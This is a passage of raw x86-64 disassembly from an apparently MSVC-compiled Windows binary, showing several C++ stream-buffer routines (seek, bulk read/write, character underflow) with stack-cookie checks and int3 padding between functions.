   140005292:	5e                   	pop    %rsi
   140005293:	5b                   	pop    %rbx
   140005294:	c3                   	ret
   140005295:	cc                   	int3
   140005296:	cc                   	int3
   140005297:	cc                   	int3
   140005298:	cc                   	int3
   140005299:	cc                   	int3
   14000529a:	cc                   	int3
   14000529b:	cc                   	int3
   14000529c:	cc                   	int3
   14000529d:	cc                   	int3
   14000529e:	cc                   	int3
   14000529f:	cc                   	int3
   1400052a0:	40 53                	rex push %rbx
   1400052a2:	56                   	push   %rsi
   1400052a3:	57                   	push   %rdi
   1400052a4:	48 83 ec 30          	sub    $0x30,%rsp
   1400052a8:	48 8b 05 91 8d 00 00 	mov    0x8d91(%rip),%rax        # 0x14000e040
   1400052af:	48 33 c4             	xor    %rsp,%rax
   1400052b2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400052b7:	49 8b 40 08          	mov    0x8(%r8),%rax
   1400052bb:	49 8b f0             	mov    %r8,%rsi
   1400052be:	49 03 00             	add    (%r8),%rax
   1400052c1:	48 8b da             	mov    %rdx,%rbx
   1400052c4:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400052cb:	00 
   1400052cc:	48 8b f9             	mov    %rcx,%rdi
   1400052cf:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400052d4:	74 70                	je     0x140005346
   1400052d6:	e8 a5 0f 00 00       	call   0x140006280
   1400052db:	84 c0                	test   %al,%al
   1400052dd:	74 67                	je     0x140005346
   1400052df:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400052e6:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400052eb:	ff 15 67 42 00 00    	call   *0x4267(%rip)        # 0x140009558
   1400052f1:	85 c0                	test   %eax,%eax
   1400052f3:	75 51                	jne    0x140005346
   1400052f5:	48 8b 46 10          	mov    0x10(%rsi),%rax
   1400052f9:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400052fd:	48 89 47 74          	mov    %rax,0x74(%rdi)
   140005301:	48 8d 47 70          	lea    0x70(%rdi),%rax
   140005305:	48 39 01             	cmp    %rax,(%rcx)
   140005308:	75 22                	jne    0x14000532c
   14000530a:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140005311:	4c 8b 87 90 00 00 00 	mov    0x90(%rdi),%r8
   140005318:	48 89 11             	mov    %rdx,(%rcx)
   14000531b:	44 2b c2             	sub    %edx,%r8d
   14000531e:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140005322:	48 89 11             	mov    %rdx,(%rcx)
   140005325:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   140005329:	44 89 01             	mov    %r8d,(%rcx)
   14000532c:	48 8b 57 74          	mov    0x74(%rdi),%rdx
   140005330:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140005335:	48 89 0b             	mov    %rcx,(%rbx)
   140005338:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   14000533c:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140005343:	00 
   140005344:	eb 15                	jmp    0x14000535b
   140005346:	33 c0                	xor    %eax,%eax
   140005348:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   14000534f:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140005356:	00 
   140005357:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000535b:	48 8b c3             	mov    %rbx,%rax
   14000535e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140005363:	48 33 cc             	xor    %rsp,%rcx
   140005366:	e8 95 19 00 00       	call   0x140006d00
   14000536b:	48 83 c4 30          	add    $0x30,%rsp
   14000536f:	5f                   	pop    %rdi
   140005370:	5e                   	pop    %rsi
   140005371:	5b                   	pop    %rbx
   140005372:	c3                   	ret
   140005373:	cc                   	int3
   140005374:	cc                   	int3
   140005375:	cc                   	int3
   140005376:	cc                   	int3
   140005377:	cc                   	int3
   140005378:	cc                   	int3
   140005379:	cc                   	int3
   14000537a:	cc                   	int3
   14000537b:	cc                   	int3
   14000537c:	cc                   	int3
   14000537d:	cc                   	int3
   14000537e:	cc                   	int3
   14000537f:	cc                   	int3
   140005380:	40 53                	rex push %rbx
   140005382:	55                   	push   %rbp
   140005383:	56                   	push   %rsi
   140005384:	57                   	push   %rdi
   140005385:	41 56                	push   %r14
   140005387:	48 83 ec 30          	sub    $0x30,%rsp
   14000538b:	48 8b 05 ae 8c 00 00 	mov    0x8cae(%rip),%rax        # 0x14000e040
   140005392:	48 33 c4             	xor    %rsp,%rax
   140005395:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000539a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000539e:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   1400053a2:	41 8b e9             	mov    %r9d,%ebp
   1400053a5:	49 8b f0             	mov    %r8,%rsi
   1400053a8:	48 8b fa             	mov    %rdx,%rdi
   1400053ab:	48 8b d9             	mov    %rcx,%rbx
   1400053ae:	4c 39 30             	cmp    %r14,(%rax)
   1400053b1:	75 10                	jne    0x1400053c3
   1400053b3:	41 83 f9 01          	cmp    $0x1,%r9d
   1400053b7:	75 0a                	jne    0x1400053c3
   1400053b9:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400053be:	75 03                	jne    0x1400053c3
   1400053c0:	48 ff ce             	dec    %rsi
   1400053c3:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400053ca:	00 
   1400053cb:	0f 84 85 00 00 00    	je     0x140005456
   1400053d1:	e8 aa 0e 00 00       	call   0x140006280
   1400053d6:	84 c0                	test   %al,%al
   1400053d8:	74 7c                	je     0x140005456
   1400053da:	48 85 f6             	test   %rsi,%rsi
   1400053dd:	75 05                	jne    0x1400053e4
   1400053df:	83 fd 01             	cmp    $0x1,%ebp
   1400053e2:	74 17                	je     0x1400053fb
   1400053e4:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400053eb:	44 8b c5             	mov    %ebp,%r8d
   1400053ee:	48 8b d6             	mov    %rsi,%rdx
   1400053f1:	ff 15 c9 41 00 00    	call   *0x41c9(%rip)        # 0x1400095c0
   1400053f7:	85 c0                	test   %eax,%eax
   1400053f9:	75 5b                	jne    0x140005456
   1400053fb:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140005402:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005407:	ff 15 5b 41 00 00    	call   *0x415b(%rip)        # 0x140009568
   14000540d:	85 c0                	test   %eax,%eax
   14000540f:	75 45                	jne    0x140005456
   140005411:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140005415:	4c 39 30             	cmp    %r14,(%rax)
   140005418:	75 22                	jne    0x14000543c
   14000541a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140005421:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140005428:	48 89 10             	mov    %rdx,(%rax)
   14000542b:	44 2b c2             	sub    %edx,%r8d
   14000542e:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140005432:	48 89 11             	mov    %rdx,(%rcx)
   140005435:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140005439:	44 89 01             	mov    %r8d,(%rcx)
   14000543c:	48 8b 53 74          	mov    0x74(%rbx),%rdx
   140005440:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140005445:	48 89 0f             	mov    %rcx,(%rdi)
   140005448:	48 89 57 10          	mov    %rdx,0x10(%rdi)
   14000544c:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140005453:	00 
   140005454:	eb 15                	jmp    0x14000546b
   140005456:	33 c0                	xor    %eax,%eax
   140005458:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   14000545f:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140005466:	00 
   140005467:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000546b:	48 8b c7             	mov    %rdi,%rax
   14000546e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140005473:	48 33 cc             	xor    %rsp,%rcx
   140005476:	e8 85 18 00 00       	call   0x140006d00
   14000547b:	48 83 c4 30          	add    $0x30,%rsp
   14000547f:	41 5e                	pop    %r14
   140005481:	5f                   	pop    %rdi
   140005482:	5e                   	pop    %rsi
   140005483:	5d                   	pop    %rbp
   140005484:	5b                   	pop    %rbx
   140005485:	c3                   	ret
   140005486:	cc                   	int3
   140005487:	cc                   	int3
   140005488:	cc                   	int3
   140005489:	cc                   	int3
   14000548a:	cc                   	int3
   14000548b:	cc                   	int3
   14000548c:	cc                   	int3
   14000548d:	cc                   	int3
   14000548e:	cc                   	int3
   14000548f:	cc                   	int3
   140005490:	40 53                	rex push %rbx
   140005492:	55                   	push   %rbp
   140005493:	57                   	push   %rdi
   140005494:	48 83 ec 20          	sub    $0x20,%rsp
   140005498:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000549d:	49 8b d8             	mov    %r8,%rbx
   1400054a0:	48 8b ea             	mov    %rdx,%rbp
   1400054a3:	48 8b f9             	mov    %rcx,%rdi
   1400054a6:	74 0e                	je     0x1400054b6
   1400054a8:	48 83 c4 20          	add    $0x20,%rsp
   1400054ac:	5f                   	pop    %rdi
   1400054ad:	5d                   	pop    %rbp
   1400054ae:	5b                   	pop    %rbx
   1400054af:	48 ff 25 a2 3c 00 00 	rex.W jmp *0x3ca2(%rip)        # 0x140009158
   1400054b6:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400054ba:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1400054bf:	48 8b f3             	mov    %rbx,%rsi
   1400054c2:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   1400054c7:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   1400054cc:	4c 8b 08             	mov    (%rax),%r9
   1400054cf:	4d 85 c9             	test   %r9,%r9
   1400054d2:	74 08                	je     0x1400054dc
   1400054d4:	48 8b 41 58          	mov    0x58(%rcx),%rax
   1400054d8:	8b 08                	mov    (%rax),%ecx
   1400054da:	eb 02                	jmp    0x1400054de
   1400054dc:	33 c9                	xor    %ecx,%ecx
   1400054de:	4c 63 f9             	movslq %ecx,%r15
   1400054e1:	48 85 db             	test   %rbx,%rbx
   1400054e4:	7e 52                	jle    0x140005538
   1400054e6:	85 c9                	test   %ecx,%ecx
   1400054e8:	7e 2e                	jle    0x140005518
   1400054ea:	49 3b df             	cmp    %r15,%rbx
   1400054ed:	49 8b c9             	mov    %r9,%rcx
   1400054f0:	4c 0f 4c fb          	cmovl  %rbx,%r15
   1400054f4:	4d 8b c7             	mov    %r15,%r8
   1400054f7:	e8 bf 27 00 00       	call   0x140007cbb
   1400054fc:	48 8b 47 58          	mov    0x58(%rdi),%rax
   140005500:	49 2b df             	sub    %r15,%rbx
   140005503:	49 03 ef             	add    %r15,%rbp
   140005506:	44 29 38             	sub    %r15d,(%rax)
   140005509:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   14000550d:	49 63 c7             	movslq %r15d,%rax
   140005510:	48 01 01             	add    %rax,(%rcx)
   140005513:	48 85 db             	test   %rbx,%rbx
   140005516:	7e 20                	jle    0x140005538
   140005518:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   14000551f:	4d 85 c9             	test   %r9,%r9
   140005522:	74 14                	je     0x140005538
   140005524:	4c 8b c3             	mov    %rbx,%r8
   140005527:	ba 01 00 00 00       	mov    $0x1,%edx
   14000552c:	48 8b cd             	mov    %rbp,%rcx
   14000552f:	ff 15 3b 40 00 00    	call   *0x403b(%rip)        # 0x140009570
   140005535:	48 2b d8             	sub    %rax,%rbx
   140005538:	4c 8b 7c 24 58       	mov    0x58(%rsp),%r15
   14000553d:	48 2b f3             	sub    %rbx,%rsi
   140005540:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   140005545:	48 8b c6             	mov    %rsi,%rax
   140005548:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000554d:	48 83 c4 20          	add    $0x20,%rsp
   140005551:	5f                   	pop    %rdi
   140005552:	5d                   	pop    %rbp
   140005553:	5b                   	pop    %rbx
   140005554:	c3                   	ret
   140005555:	cc                   	int3
   140005556:	cc                   	int3
   140005557:	cc                   	int3
   140005558:	cc                   	int3
   140005559:	cc                   	int3
   14000555a:	cc                   	int3
   14000555b:	cc                   	int3
   14000555c:	cc                   	int3
   14000555d:	cc                   	int3
   14000555e:	cc                   	int3
   14000555f:	cc                   	int3
   140005560:	40 55                	rex push %rbp
   140005562:	56                   	push   %rsi
   140005563:	41 56                	push   %r14
   140005565:	48 83 ec 30          	sub    $0x30,%rsp
   140005569:	4d 8b f0             	mov    %r8,%r14
   14000556c:	48 8b ea             	mov    %rdx,%rbp
   14000556f:	48 8b f1             	mov    %rcx,%rsi
   140005572:	4d 85 c0             	test   %r8,%r8
   140005575:	7f 0b                	jg     0x140005582
   140005577:	33 c0                	xor    %eax,%eax
   140005579:	48 83 c4 30          	add    $0x30,%rsp
   14000557d:	41 5e                	pop    %r14
   14000557f:	5e                   	pop    %rsi
   140005580:	5d                   	pop    %rbp
   140005581:	c3                   	ret
   140005582:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140005587:	74 0f                	je     0x140005598
   140005589:	48 83 c4 30          	add    $0x30,%rsp
   14000558d:	41 5e                	pop    %r14
   14000558f:	5e                   	pop    %rsi
   140005590:	5d                   	pop    %rbp
   140005591:	48 ff 25 c8 3b 00 00 	rex.W jmp *0x3bc8(%rip)        # 0x140009160
   140005598:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000559c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400055a1:	49 8b de             	mov    %r14,%rbx
   1400055a4:	48 8b 10             	mov    (%rax),%rdx
   1400055a7:	48 85 d2             	test   %rdx,%rdx
   1400055aa:	74 08                	je     0x1400055b4
   1400055ac:	48 8b 41 50          	mov    0x50(%rcx),%rax
   1400055b0:	8b 08                	mov    (%rax),%ecx
   1400055b2:	eb 02                	jmp    0x1400055b6
   1400055b4:	33 c9                	xor    %ecx,%ecx
   1400055b6:	48 63 c1             	movslq %ecx,%rax
   1400055b9:	85 c9                	test   %ecx,%ecx
   1400055bb:	74 35                	je     0x1400055f2
   1400055bd:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400055c2:	49 3b c6             	cmp    %r14,%rax
   1400055c5:	49 8b fe             	mov    %r14,%rdi
   1400055c8:	48 8b cd             	mov    %rbp,%rcx
   1400055cb:	48 0f 42 f8          	cmovb  %rax,%rdi
   1400055cf:	4c 8b c7             	mov    %rdi,%r8
   1400055d2:	e8 e4 26 00 00       	call   0x140007cbb
   1400055d7:	48 8b 46 50          	mov    0x50(%rsi),%rax
   1400055db:	48 03 ef             	add    %rdi,%rbp
   1400055de:	48 2b df             	sub    %rdi,%rbx
   1400055e1:	29 38                	sub    %edi,(%rax)
   1400055e3:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
   1400055e7:	48 63 c7             	movslq %edi,%rax
   1400055ea:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400055ef:	48 01 01             	add    %rax,(%rcx)
   1400055f2:	48 83 be 80 00 00 00 	cmpq   $0x0,0x80(%rsi)
   1400055f9:	00 
   1400055fa:	0f 84 8e 00 00 00    	je     0x14000568e
   140005600:	4c 8b 46 18          	mov    0x18(%rsi),%r8
   140005604:	48 8d 46 70          	lea    0x70(%rsi),%rax
   140005608:	49 39 00             	cmp    %rax,(%r8)
   14000560b:	75 20                	jne    0x14000562d
   14000560d:	48 8b 8e 88 00 00 00 	mov    0x88(%rsi),%rcx
   140005614:	48 8b 96 90 00 00 00 	mov    0x90(%rsi),%rdx
   14000561b:	49 89 08             	mov    %rcx,(%r8)
   14000561e:	2b d1                	sub    %ecx,%edx
   140005620:	48 8b 46 38          	mov    0x38(%rsi),%rax
   140005624:	48 89 08             	mov    %rcx,(%rax)
   140005627:	48 8b 46 50          	mov    0x50(%rsi),%rax
   14000562b:	89 10                	mov    %edx,(%rax)
   14000562d:	48 81 fb ff 0f 00 00 	cmp    $0xfff,%rbx
   140005634:	76 38                	jbe    0x14000566e
   140005636:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000563d:	00 00 00 
   140005640:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   140005647:	ba 01 00 00 00       	mov    $0x1,%edx
   14000564c:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   140005652:	48 8b cd             	mov    %rbp,%rcx
   140005655:	ff 15 2d 3f 00 00    	call   *0x3f2d(%rip)        # 0x140009588
   14000565b:	48 03 e8             	add    %rax,%rbp
   14000565e:	48 2b d8             	sub    %rax,%rbx
   140005661:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   140005667:	75 25                	jne    0x14000568e
   140005669:	48 3b d8             	cmp    %rax,%rbx
   14000566c:	77 d2                	ja     0x140005640
   14000566e:	48 85 db             	test   %rbx,%rbx
   140005671:	74 1b                	je     0x14000568e
   140005673:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   14000567a:	4c 8b c3             	mov    %rbx,%r8
   14000567d:	ba 01 00 00 00       	mov    $0x1,%edx
   140005682:	48 8b cd             	mov    %rbp,%rcx
   140005685:	ff 15 fd 3e 00 00    	call   *0x3efd(%rip)        # 0x140009588
   14000568b:	48 2b d8             	sub    %rax,%rbx
   14000568e:	4c 2b f3             	sub    %rbx,%r14
   140005691:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140005696:	49 8b c6             	mov    %r14,%rax
   140005699:	48 83 c4 30          	add    $0x30,%rsp
   14000569d:	41 5e                	pop    %r14
   14000569f:	5e                   	pop    %rsi
   1400056a0:	5d                   	pop    %rbp
   1400056a1:	c3                   	ret
   1400056a2:	cc                   	int3
   1400056a3:	cc                   	int3
   1400056a4:	cc                   	int3
   1400056a5:	cc                   	int3
   1400056a6:	cc                   	int3
   1400056a7:	cc                   	int3
   1400056a8:	cc                   	int3
   1400056a9:	cc                   	int3
   1400056aa:	cc                   	int3
   1400056ab:	cc                   	int3
   1400056ac:	cc                   	int3
   1400056ad:	cc                   	int3
   1400056ae:	cc                   	int3
   1400056af:	cc                   	int3
   1400056b0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400056b5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400056ba:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400056bf:	55                   	push   %rbp
   1400056c0:	48 8b ec             	mov    %rsp,%rbp
   1400056c3:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400056ca:	48 8b 05 6f 89 00 00 	mov    0x896f(%rip),%rax        # 0x14000e040
   1400056d1:	48 33 c4             	xor    %rsp,%rax
   1400056d4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400056d8:	48 8b f9             	mov    %rcx,%rdi
   1400056db:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400056df:	48 8b 08             	mov    (%rax),%rcx
   1400056e2:	48 85 c9             	test   %rcx,%rcx
   1400056e5:	74 2c                	je     0x140005713
   1400056e7:	48 8b 57 50          	mov    0x50(%rdi),%rdx
   1400056eb:	4c 63 0a             	movslq (%rdx),%r9
   1400056ee:	4a 8d 04 09          	lea    (%rcx,%r9,1),%rax
   1400056f2:	48 3b c8             	cmp    %rax,%rcx
   1400056f5:	73 1c                	jae    0x140005713
   1400056f7:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   1400056fb:	89 02                	mov    %eax,(%rdx)
   1400056fd:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140005701:	48 8b 11             	mov    (%rcx),%rdx
   140005704:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140005708:	48 89 01             	mov    %rax,(%rcx)
   14000570b:	0f b6 02             	movzbl (%rdx),%eax
   14000570e:	e9 5c 02 00 00       	jmp    0x14000596f
   140005713:	48 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%rdi)
   14000571a:	00 
   14000571b:	75 0a                	jne    0x140005727
   14000571d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005722:	e9 48 02 00 00       	jmp    0x14000596f
   140005727:	4c 8b 4f 18          	mov    0x18(%rdi),%r9
   14000572b:	48 8d 47 70          	lea    0x70(%rdi),%rax
   14000572f:	49 39 01             	cmp    %rax,(%r9)
   140005732:	75 20                	jne    0x140005754
   140005734:	48 8b 97 90 00 00 00 	mov    0x90(%rdi),%rdx
   14000573b:	48 8b 8f 88 00 00 00 	mov    0x88(%rdi),%rcx
   140005742:	49 89 09             	mov    %rcx,(%r9)
   140005745:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140005749:	48 89 08             	mov    %rcx,(%rax)
   14000574c:	2b d1                	sub    %ecx,%edx
   14000574e:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140005752:	89 10                	mov    %edx,(%rax)
   140005754:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   14000575b:	48 83 7f 68 00       	cmpq   $0x0,0x68(%rdi)
   140005760:	75 1c                	jne    0x14000577e
   140005762:	ff 15 28 3e 00 00    	call   *0x3e28(%rip)        # 0x140009590
   140005768:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000576b:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140005770:	0f 84 f7 01 00 00    	je     0x14000596d
   140005776:	0f b6 d8             	movzbl %al,%ebx
   140005779:	e9 ef 01 00 00       	jmp    0x14000596d
   14000577e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005781:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140005785:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   14000578c:	00 
   14000578d:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140005794:	00 
   140005795:	c6 45 d8 00          	movb   $0x0,-0x28(%rbp)
   140005799:	ff 15 f1 3d 00 00    	call   *0x3df1(%rip)        # 0x140009590
   14000579f:	44 8b c8             	mov    %eax,%r9d
   1400057a2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400057a5:	0f 84 01 01 00 00    	je     0x1400058ac
   1400057ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400057b0:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400057b4:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   1400057b8:	49 3b d0             	cmp    %r8,%rdx
   1400057bb:	73 20                	jae    0x1400057dd
   1400057bd:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   1400057c1:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   1400057c5:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400057c9:	49 83 f8 0f          	cmp    $0xf,%r8
   1400057cd:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   1400057d2:	44 88 0c 10          	mov    %r9b,(%rax,%rdx,1)
   1400057d6:	c6 44 10 01 00       	movb   $0x0,0x1(%rax,%rdx,1)
   1400057db:	eb 09                	jmp    0x1400057e6
   1400057dd:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400057e1:	e8 7a 0c 00 00       	call   0x140006460
   1400057e6:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400057ea:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   1400057ef:	48 0f 47 55 d8       	cmova  -0x28(%rbp),%rdx
   1400057f4:	4c 8d 45 d8          	lea    -0x28(%rbp),%r8
   1400057f8:	4c 0f 47 45 d8       	cmova  -0x28(%rbp),%r8
   1400057fd:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   140005801:	4c 03 ca             	add    %rdx,%r9
   140005804:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   140005808:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000580d:	48 8d 45 d1          	lea    -0x2f(%rbp),%rax
   140005811:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005816:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   14000581a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000581f:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140005823:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005828:	48 8d 57 74          	lea    0x74(%rdi),%rdx
   14000582c:	48 8b 4f 68          	mov    0x68(%rdi),%rcx
   140005830:	ff 15 52 39 00 00    	call   *0x3952(%rip)        # 0x140009188
   140005836:	85 c0                	test   %eax,%eax
   140005838:	74 09                	je     0x140005843
   14000583a:	83 e8 01             	sub    $0x1,%eax
   14000583d:	0f 85 c2 00 00 00    	jne    0x140005905
   140005843:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140005847:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
   14000584b:	48 39 45 c8          	cmp    %rax,-0x38(%rbp)
   14000584f:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005853:	0f 85 c4 00 00 00    	jne    0x14000591d
   140005859:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000585e:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005863:	4c 8b 4d c0          	mov    -0x40(%rbp),%r9
   140005867:	4c 2b c8             	sub    %rax,%r9
   14000586a:	49 3b d9             	cmp    %r9,%rbx
   14000586d:	4c 0f 42 cb          	cmovb  %rbx,%r9
   140005871:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140005875:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000587a:	48 0f 47 4d d8       	cmova  -0x28(%rbp),%rcx
   14000587f:	49 2b d9             	sub    %r9,%rbx
   140005882:	4c 8d 43 01          	lea    0x1(%rbx),%r8
   140005886:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   14000588a:	e8 32 24 00 00       	call   0x140007cc1
   14000588f:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   140005893:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   14000589a:	ff 15 f0 3c 00 00    	call   *0x3cf0(%rip)        # 0x140009590
   1400058a0:	44 8b c8             	mov    %eax,%r9d
   1400058a3:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400058a6:	0f 85 04 ff ff ff    	jne    0x1400057b0
   1400058ac:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400058b1:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400058b5:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400058b9:	0f 86 ae 00 00 00    	jbe    0x14000596d
   1400058bf:	48 ff c2             	inc    %rdx
   1400058c2:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400058c6:	48 8b c1             	mov    %rcx,%rax
   1400058c9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400058d0:	0f 82 92 00 00 00    	jb     0x140005968
   1400058d6:	48 83 c2 27          	add    $0x27,%rdx
   1400058da:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400058de:	48 2b c1             	sub    %rcx,%rax
   1400058e1:	48 83 e8 08          	sub    $0x8,%rax
   1400058e5:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400058e9:	76 7d                	jbe    0x140005968
   1400058eb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400058f2:	00 00 
   1400058f4:	45 33 c9             	xor    %r9d,%r9d
   1400058f7:	45 33 c0             	xor    %r8d,%r8d
   1400058fa:	33 d2                	xor    %edx,%edx
   1400058fc:	33 c9                	xor    %ecx,%ecx
   1400058fe:	ff 15 3c 3c 00 00    	call   *0x3c3c(%rip)        # 0x140009540
   140005904:	90                   	nop
   140005905:	83 f8 02             	cmp    $0x2,%eax
   140005908:	75 a2                	jne    0x1400058ac
   14000590a:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   14000590e:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140005913:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005918:	0f be 18             	movsbl (%rax),%ebx
   14000591b:	eb 94                	jmp    0x1400058b1
   14000591d:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   140005922:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005927:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000592b:	48 2b d9             	sub    %rcx,%rbx
   14000592e:	48 03 d8             	add    %rax,%rbx
   140005931:	48 85 db             	test   %rbx,%rbx
   140005934:	7e 29                	jle    0x14000595f
   140005936:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000593d:	00 00 00 
   140005940:	48 ff cb             	dec    %rbx
   140005943:	0f be 0c 0b          	movsbl (%rbx,%rcx,1),%ecx
   140005947:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   14000594e:	ff 15 fc 3b 00 00    	call   *0x3bfc(%rip)        # 0x140009550
   140005954:	48 85 db             	test   %rbx,%rbx
   140005957:	7e 06                	jle    0x14000595f
   140005959:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000595d:	eb e1                	jmp    0x140005940
   14000595f:	0f b6 5d d0          	movzbl -0x30(%rbp),%ebx
   140005963:	e9 49 ff ff ff       	jmp    0x1400058b1
   140005968:	e8 b3 13 00 00       	call   0x140006d20
   14000596d:	8b c3                	mov    %ebx,%eax
   14000596f:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140005973:	48 33 cc             	xor    %rsp,%rcx
